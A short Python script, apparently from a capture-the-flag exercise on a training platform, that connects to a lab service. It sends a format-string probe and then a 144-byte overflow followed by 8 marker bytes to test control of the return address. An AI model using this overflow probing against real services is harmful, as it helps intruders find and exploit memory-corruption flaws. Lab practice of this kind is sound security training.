import sys, socket, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "chatelaine.cylabacademy.net", 45231
for attempt in range(3):
    try:
        s = socket.create_connection((HOST, PORT), timeout=15)
        time.sleep(0.5)
        # premier input : format string inoffensif
        s.sendall(b"A\n")
        time.sleep(0.5)
        # deuxieme input : overflow
        payload = b"A" * 144 + b"BBBBBBBB" + b"\n"
        s.sendall(payload)
        time.sleep(1)
        data = b""
        s.settimeout(5)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except Exception:
            pass
        print("=== reponse ===")
        print(data.decode("utf-8", "replace")[:2000])
        s.close()
        break
    except Exception as e:
        print("err", type(e).__name__, e)
        time.sleep(2)
